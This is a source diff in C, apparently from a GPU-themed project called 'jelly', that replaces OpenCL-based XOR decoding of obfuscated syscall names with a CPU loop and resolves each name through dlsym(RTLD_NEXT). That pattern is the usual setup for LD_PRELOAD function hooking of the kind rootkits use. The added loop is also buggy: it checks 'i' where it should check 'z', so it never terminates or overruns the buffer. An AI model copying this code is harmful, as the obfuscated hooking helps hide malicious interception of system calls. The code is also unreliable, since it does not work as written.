@@ -70,57 +70,19 @@ cl_program build_program(cl_context ctx, cl_device_id dev, const char *filename)
     return jelly->program;
 }
 
-// It would probably just be better to xor in cpu but this is just example of using gpu to do things for us
 void jelly_init(){
-    char *buf, *buf2, *buf3;
+    char *buf;
+    int code = 0x42;
 
-    int i;
+    int i, z;
     for(i = 0; i < SYSCALL_SIZE; i++){
-        jelly->dev = create_device();
-        jelly->ctx = clCreateContext(NULL, 1, &jelly->dev, NULL, NULL, &err);
-        jelly->program = build_program(jelly->ctx, jelly->dev, __JELLYXOR__);
-
-	buf = (char *)malloc(strlen(syscall_table[i]) + 20);
-        buf2 = (char *)malloc(strlen(buf) + 1);
-	buf3 = (char *)malloc(strlen(buf2));
-
-	strcpy(buf, syscall_table[i]);
-
-        // xor syscall in gpu
-        input = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf, &err);
-        local = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf2, &err);
-        group = clCreateBuffer(jelly->ctx, CL_MEM_READ_WRITE | CL_MEM_COPY_HOST_PTR, VRAM_LIMIT * sizeof(char), buf3, &err);
-
-        // host-device command queue
-        jelly->cq = clCreateCommandQueue(jelly->ctx, jelly->dev, 0, &err);
-
-        // gpu kernel thread
-        jelly->kernels[3] = clCreateKernel(jelly->program, jelly_xor, &err);
-
-        // gpu kernel args
-        clSetKernelArg(jelly->kernels[3], 0, sizeof(cl_mem), &input);
-        clSetKernelArg(jelly->kernels[3], 1, sizeof(cl_mem), &local);
-        clSetKernelArg(jelly->kernels[3], 2, sizeof(cl_mem), &group);
-
-        // host-device comm
-        clEnqueueNDRangeKernel(jelly->cq, jelly->kernels[3], 1, NULL, &global_size, &local_size, 0, NULL, NULL);
-        
-        // read xor'ed syscall from gpu
-        clEnqueueReadBuffer(jelly->cq, group, CL_TRUE, 0, sizeof(buf3), buf3, 0, NULL, NULL);
-
-	syscalls[i].syscall_func = dlsym(RTLD_NEXT, buf3);
-
+	buf = (char *)malloc(strlen(syscall_table[i]) + 1);
+        strcpy(buf, syscall_table[i]);
+	for(z = 0; i < strlen(buf); z++){
+	    buf[z] ^= code;
+	}
+	syscalls[i].syscall_func = dlsym(RTLD_NEXT, buf);
 	free(buf);
-	free(buf2);
-	free(buf3);
-
-        clReleaseContext(jelly->ctx);
-        clReleaseProgram(jelly->program);
-        clReleaseMemObject(input);
-	clReleaseMemObject(local);
-        clReleaseMemObject(group);
-	clReleaseCommandQueue(jelly->cq);
-	clReleaseKernel(jelly->kernels[3]);
     }
 }
 
